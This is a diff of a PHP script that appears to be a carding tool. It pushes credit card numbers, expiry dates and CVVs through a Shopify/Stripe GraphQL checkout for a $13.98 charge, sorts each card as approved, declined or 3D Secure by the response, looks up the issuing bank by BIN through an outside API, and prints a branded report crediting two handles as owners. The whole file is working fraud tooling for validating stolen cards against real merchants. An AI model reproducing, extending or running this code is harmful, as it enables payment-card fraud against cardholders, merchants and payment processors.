@@ -800,54 +800,76 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, [
 
 curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
 
-        $response5 = curl_exec($ch);
+$start = microtime(true); // ▶️ Start timing
 
-        curl_close($ch);
+$response5 = curl_exec($ch);
 
-        $r5js = json_decode($response5);
+$end = microtime(true); // ▶️ End timing
+$time_taken = number_format($end - $start, 2);
 
-        if (str_contains($response5, $checkouturl . '/thank_you')) {
-            $err = 'Thank you for your purchase! -> 13.98$';
-        } elseif (str_contains($response5, $checkouturl . '/post_purchase')) {
-            $err = 'Thank you for your purchase! -> 13.98$'; 
-        } elseif (str_contains($response5, 'Your order is confirmed')) {
-            $err = 'Order Placed! ->> 13.98$';
-        } elseif (isset($r5js->data->receipt->processingError->code)) {
-            $err = $r5js->data->receipt->processingError->code;
-        } elseif (str_contains($response5, 'CompletePaymentChallenge')) {
-            $err = '3d Secure Card';
-        } elseif (str_contains($response5, 'https://blackmp.life/stripe/authentications/')) {
-            $err = '3ds Card';
-        } elseif (isset($r5js->data->receipt->action->__typename) && $r5js->data->receipt->action->__typename == 'CompletePaymentChallenge') {
-            $err = '3DS Secure';
-        } elseif (isset($r5js->data->receipt->action->url)) {
-            $err = '3d secure card';
-        } elseif (preg_match('/CompletePaymentChallenge/', $response5)) {
-            $err = '3D secure';
-        } else {
-            $err = 'Response is empty!';
-        }
+curl_close($ch);
 
-    } catch(Exception $e){
-        // Handle exceptions, set $err
-        if(empty($err)){
-            $err = $e->getMessage();
-        }
+$r5js = json_decode($response5);
+
+if (str_contains($response5, $checkouturl . '/thank_you')) {
+    $err = '🔥Thank you for your purchase! -> $13.99';
+} elseif (str_contains($response5, $checkouturl . '/post_purchase')) {
+    $err = '🔥Thank you for your purchase! -> $13.99'; 
+} elseif (str_contains($response5, 'Your order is confirmed')) {
+    $err = '🔥Your Order Has Been Placed! ->> $13.98';
+} elseif (isset($r5js->data->receipt->processingError->code)) {
+    $err = $r5js->data->receipt->processingError->code;
+} elseif (str_contains($response5, 'CompletePaymentChallenge')) {
+    $err = '⚠️ 3D Secure Card Challenge !!';
+} elseif (str_contains($response5, 'https://blackmp.life/stripe/authentications/')) {
+    $err = '⚠️3DS Required !!';
+} elseif (isset($r5js->data->receipt->action->__typename) && $r5js->data->receipt->action->__typename == 'CompletePaymentChallenge') {
+    $err = '⚠️3DS Secure Required !!';
+} elseif (isset($r5js->data->receipt->action->url)) {
+    $err = '⚠️ 3d Secure Card !!';
+} elseif (preg_match('/CompletePaymentChallenge/', $response5)) {
+    $err = '⚠️ 3D secure';
+} else {
+    $err = 'Response is empty!';
+}
+
+} catch(Exception $e){
+    if(empty($err)){
+        $err = $e->getMessage();
     }
+}
 
-    $fullmsg = "𝘾𝘼𝙍𝘿 ↯ " . $cc . '|' . $sub_month . '|' . $year . '|' . $cvv . "\n";
-    $fullmsg .= "𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ Stripe + Shopify $13.98 (Graphql)\n";
-    $fullmsg .= "𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ " . $err . "\n";
-    $fullmsg .= "𝙏𝙄𝙈𝙀 ↯ " . date('Y-m-d H:i:s') . "\n";
-    $fullmsg .= "𝙊𝙬𝙣𝙚𝙧 ↯ " . '@mhitzxg' . "\n";
-    $fullmsg .= "└─────────────────────┘\n";
+// ▶️ BIN lookup
+$bin = substr($cc, 0, 6);
+$bininfo = json_decode(file_get_contents("https://bins-su-api.pages.dev/api/$bin"), true);
+$bank = $bininfo['bank'] ?? 'Unavailable';
+$country = $bininfo['country'] ?? 'Unknown';
+$brand = $bininfo['vendor'] ?? 'Unknown';
+$type = $bininfo['type'] ?? 'Unknown';
 
+// ▶️ Status logic
+if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, 'Order') !== false) {
+    $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃";
+} else {
+    $status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃";
+}
 
-    echo "<pre>" . htmlspecialchars($fullmsg, ENT_QUOTES, 'UTF-8') . "</pre>";
-    // Add padding to ensure the browser renders the output
-    echo str_repeat(' ', 1024);
-    flush();
-} 
+$gate = "🛒 𝐆𝐀𝐓𝐄𝐖𝐀𝐘 ↯ Stripe + Shopify $13.98 (Graphql) Charge";
 
+$fullmsg  = "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
+$fullmsg .= "💥 {$gate}\n";
+$fullmsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+$fullmsg .= "{$status}\n\n";
+$fullmsg .= "💳 𝐂𝐀𝐑𝐃   ↯ {$cc}|{$sub_month}|{$year}|{$cvv}\n";
+$fullmsg .= "🏦 𝐁𝐀𝐍𝐊   ↯ {$bank} - {$brand} - {$type}\n";
+$fullmsg .= "🌎 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ↯ {$country}\n";
+$fullmsg .= "🕒 𝐓𝐈𝐌𝐄   ↯ " . date('Y-m-d H:i:s') . "\n";
+$fullmsg .= "⏱️ 𝐒𝐏𝐄𝐄𝐃  ↯ {$time_taken}s\n";
+$fullmsg .= "📩 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ↯ {$err}\n\n";
+$fullmsg .= "👑 𝐎𝐖𝐍𝐄𝐑 ↯ @mhitzxg | @pr0xy_xd\n";
+$fullmsg .= "┗━━━━━━━━━━━━━━━━━━━━━━━┛";
 
+echo "<pre>" . htmlspecialchars($fullmsg, ENT_QUOTES, 'UTF-8') . "</pre>";
+echo str_repeat(' ', 1024);
+flush();
 ?>
